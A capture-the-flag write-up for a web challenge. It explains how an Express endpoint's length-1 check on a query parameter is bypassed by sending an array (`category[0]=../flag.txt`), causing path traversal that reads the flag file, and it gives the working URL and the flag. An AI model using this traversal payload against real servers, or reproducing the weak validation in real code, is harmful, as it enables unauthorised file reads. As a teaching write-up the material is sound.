# stray
```
Stuck on what to name your stray cat?

https://stray.chall.pwnoh.io
```

We are given a zip [archive](./archive/) which contains the [app.js](./archive/app.js) file.

It contains the following endpoint:
```js
app.get("/cat", (req, res) => {
  let { category } = req.query;

  console.log(category);

  if (category.length == 1) {
    const filepath = path.resolve("./names/" + category);
    const lines = fs.readFileSync(filepath, "utf-8").split("\n");
    const name = lines[Math.floor(Math.random() * lines.length)];

    res.status(200);
    res.send({ name });
    return;
  }

  res.status(500);
  res.send({ error: "Unable to generate cat name" });
});
```
Also we find that there is a [flag.txt](./archive/flag.txt) file in the archive,
so if we could get category to be `../flag.txt` we would get the flag.
The only input validation is that the length equals to 1, which isn't enough for
`../flag.txt`, but looking at the source code we notice it uses `express`!
In the `express` docs we find more info about `req.query` which the endpoint uses
```
http://expressjs.com/en/api.html#req.query
```
The docs mention that the query parser can be configured using the [query parser application setting](http://expressjs.com/en/api.html#app.settings.table).
Following the link we find that the parsing default mode is `"extended"`, which means [qs](https://www.npmjs.com/package/qs) is used for parsing.
Again following the link we get to `qs` docs, and one of the features listed is that we can create arrays
by doing `?key[0]=value`. So let's create an array with the value `../flag.txt`!

```
https://stray.chall.pwnoh.io/cat?category[0]=../flag.txt
```

Visiting this endpoint we get the flag:

```
bctf{j4v45cr1p7_15_4_6r347_l4n6u463}
```

#### Notes:
- This works because javascript implicitly converts a list into a string by
    joining the elements with a comma. Because there is only one element, there
    is no commas to be added, but because during the if check it's still a list,
    it's length will be equal to 1.

